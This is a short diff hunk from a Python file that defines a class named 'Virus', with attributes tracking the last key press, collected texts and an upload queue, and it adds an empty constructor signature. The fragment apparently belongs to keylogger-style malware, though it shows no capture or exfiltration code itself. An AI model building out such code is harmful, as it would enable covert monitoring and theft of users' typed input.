@@ -32,3 +32,5 @@ class Virus(object):
     last_press = time.time()
     texts = []
     upload_queue = Queue()
+
+    def __init__(self):
